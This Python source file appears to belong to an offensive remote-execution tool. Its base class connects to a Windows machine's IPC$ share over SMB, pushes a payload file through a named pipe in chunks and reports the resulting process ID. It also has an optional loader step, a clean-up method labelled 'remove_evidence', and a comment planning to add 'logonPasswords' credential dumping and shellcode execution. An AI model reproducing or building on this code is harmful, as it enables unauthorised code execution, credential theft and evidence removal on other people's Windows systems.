# -*- coding: UTF-8 -*-

import logging
import sys
import traceback

from .connector import open_namedpipe
from .connector import receive_status
from .connector import send_data

WINDOWS_ERROR_CODES = {
    0: "SUCCESS",
    1: "INVALID_FUNCTION",
    2: "FILE_NOT_FOUND",
    3: "PATH_NOT_FOUND",
    4: "TOO_MANY_OPEN_FILES",
    5: "ACCESS_DENIED",
    14: "OUT_OF_MEMORY",
    80: "FILE_EXISTS",
    87: "INVALID_PARAMETER"
}


class BasePokeBall(object):

    def __init__(self, opts):
        self.opts = opts
        self.traffic = 4096
        self.pipe_name = opts["pipe_name"]
        self.payload_path = None
        self.helper = None

        self.smb_conn = None
        self.pid = 0

    def init(self):
        raise NotImplementedError("func init")

    def delivery_loader(self):
        raise NotImplementedError("func delivery_loader")

    def delivery_payload(self):
        if self.payload_path is None:
            raise NotImplementedError("self.payload_path is not set")
        if self.smb_conn is None:
            raise NotImplementedError("self.smb_conn is not set")

        with open(self.payload_path, 'rb') as f:
            payload = f.read()

        tid = self.smb_conn.connectTree("IPC$")
        fid = open_namedpipe(self.smb_conn, tid, self.pipe_name)

        # TODO: implement logonPasswords and execute shellcode here
        send_data(self.smb_conn, tid, fid, self.pipe_name, 0, payload, self.traffic)
        pid, code = receive_status(self.smb_conn, tid, fid)
        self.smb_conn.disconnectTree(tid)

        if code != 0:
            if code in WINDOWS_ERROR_CODES:
                str_err = WINDOWS_ERROR_CODES[code]
            else:
                str_err = "unknown error"
            raise Exception("FAILED: {code} - {str_err}".format(code=code, str_err=str_err))
        else:
            self.pid = pid
            logging.info("ProcessID: {pid}".format(pid=pid))

    def clean_up(self):
        raise NotImplementedError("func remove_evidence")

    def run(self):
        interrupted = False
        try:
            logging.info("Getting started")
            self.init()

            if self.opts["new"]:
                self.traffic = 500 * 1024
            else:
                try:
                    major = self.smb_conn.getServerOSMajor()
                    minor = self.smb_conn.getServerOSMinor()
                    if major >= 7 or (major == 6 and minor >= 1):
                        self.traffic = 500 * 1024
                except:
                    pass

            if not self.opts["skip_loader"]:
                logging.info("Delivering loader")
                self.delivery_loader()

            logging.info("Delivering payload")
            self.delivery_payload()
        except BaseException as e:
            logging.debug(traceback.format_exc())
            interrupted = True
            logging.error(e)

        logging.info("Cleaning up")
        try:
            self.clean_up()
        except:
            pass

        if interrupted:
            sys.exit(1)
